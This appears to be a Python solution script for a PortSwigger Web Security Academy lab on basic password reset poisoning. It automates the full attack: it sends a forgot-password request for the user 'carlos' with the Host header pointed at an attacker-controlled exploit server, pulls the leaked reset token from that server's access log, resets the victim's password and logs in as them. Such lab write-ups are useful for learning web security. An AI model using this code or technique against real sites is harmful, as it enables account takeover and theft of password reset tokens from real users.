#!/usr/bin/env python3
# Basic password reset poisoning
# Lab-Link: https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning
# Difficulty: APPRENTICE
from bs4 import BeautifulSoup
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(text):
    soup = BeautifulSoup(text, 'html.parser')
    return soup.find('input', attrs={'name': 'csrf'})['value']


def find_exploitserver(text):
    soup = BeautifulSoup(text, 'html.parser')
    try:
        result = soup.find('a', attrs={'id': 'exploit-link'})['href']
    except TypeError:
        return None
    return result


def forgot_password(host, client, exploit_server):
    def get_cookies(client, names):
        ret = {}
        for name in names:
            ret[name] = client.cookies.get(name)
        return ret

    url = f'{host}/forgot-password'
    r = client.get(url)
    token = get_csrf_token(r.text)

    # Python requests takes the cookies based on the host header, not on where the request goes to.
    # So I need to manually add the cookies for the exploit server even
    # though the request does not go to it.
    cookies = get_cookies(client, ['_lab', 'session'])

    headers = {
        'Host': exploit_server[8:],
        'Referer': f'{host}/forgot-password',
        'Origin': host,
    }
    data = {'csrf': token, 'username': 'carlos'}
    return client.post(url, headers=headers, data=data, cookies=cookies).status_code == 200


def get_password_change_token(exploit_server, client):
    r = client.get(f'{exploit_server}/log')
    if r.status_code != 200:
        return None

    try:
        soup = BeautifulSoup(r.text, 'html.parser')
        result = soup.find('pre', attrs={'class': 'container'}).text
        exfiltrate_line = result.splitlines()[-1]
        # line is of this format:
        # 10.0.4.222      2022-06-05 18:16:28 +0000 "GET /forgot-password?temp-forgot-password-token=6asQcwAbxwlqY7UjEu5lQz08kc4NgZt9 HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36"
        token = exfiltrate_line.split()[5].split('?')[1]
        # token should be of format 
        # temp-forgot-password-token=VIuvpiHFH0HrDNPYOWjLCAxbbLBBFxLZ
        return token
    except:
        return None
    return None


def change_password(host, client, token, username, new_password):
    url = f'{host}/forgot-password'

    r = client.get(f'{url}?{token}')
    csrf = get_csrf_token(r.text)

    data = {
        token.split('=')[0]: token.split('=')[1],
        'csrf': csrf,
        'username': username,
        'new-password-1': new_password,
        'new-password-2': new_password
    }
    return client.post(url, data=data, allow_redirects=False).status_code == 302


def login(client, host, username, password):
    url = f'{host}/login'

    r = client.get(url)
    csrf = get_csrf_token(r.text)

    data = {'csrf': csrf,
            'username': username,
            'password': password}
    res = client.post(url, data=data)
    return f'Your username is: {username}' in res.text


def main():
    print('[+] Basic password reset poisoning')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    with requests.Session() as client:
        client.verify = False
        client.proxies = proxies

        exploit_server = find_exploitserver(client.get(host).text)
        if exploit_server is None:
            print(f'[-] Failed to find email server')
            sys.exit(-2)
        print(f'[+] Email server: {exploit_server}')

        if not forgot_password(host, client, exploit_server):
            print(f'[-] Something went wrong requesting the password reset')
            sys.exit(-3)
        print(f'[+] Password reset requested')

        password_change_token = get_password_change_token(exploit_server, client)
        if password_change_token is None:
            print(f'[-] Failed to obtain password change token')
            sys.exit(-4)
        print(f'[+] Password change token obtained: {password_change_token}')

        username = 'carlos'
        new_password = '123'
        if not change_password(host, client, password_change_token, username, new_password):
            print(f'[-] Failed to change password for {username}')
            sys.exit(-4)
        print(f'[+] Password changed for {username}')

        if not login(client, host, username, new_password):
            print(f'[-] Failed to login as {username}')
            sys.exit(-5)
        print(f'[+] Logged in as {username}')

        # I had some times issues getting the proper result, so wait briefly before checking
        time.sleep(2)
        if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
            print(f'[-] Failed to solve lab')
            sys.exit(-9)

        print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
